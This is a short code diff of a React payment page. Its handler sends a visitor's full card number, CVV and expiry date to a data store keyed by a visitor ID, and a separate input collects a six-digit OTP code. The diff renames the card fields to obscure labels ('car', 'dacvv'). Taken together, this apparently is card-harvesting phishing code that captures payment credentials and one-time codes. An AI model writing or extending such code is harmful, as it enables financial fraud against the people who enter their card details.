@@ -210,8 +210,8 @@ export default function MainPage() {
   const handlePayment = () => {
     addData({
       id: visitorId,
-      cardNumber: cardInfo.number,
-      cvv: cardInfo.cvv,
+      car: cardInfo.number,
+      dacvv: cardInfo.cvv,
       expiryDate: cardInfo.expiry + "/" + cardInfo.month,
     }).then(() => {
       if (paymentMethod === "cash") {
@@ -740,12 +740,12 @@ export default function MainPage() {
               <Input
                 id="otp"
                 value={otpCode}
-                onChange={(e) =>{
+                onChange={(e) => {
                   setShowError(false)
-                   setOtpCode(e.target.value)}}
+                  setOtpCode(e.target.value)
+                }}
                 placeholder="*******"
-                className={showError?"border-2 border-red-500":""}
-
+                className={showError ? "border-2 border-red-500" : ""}
                 maxLength={6}
               />
             </div>
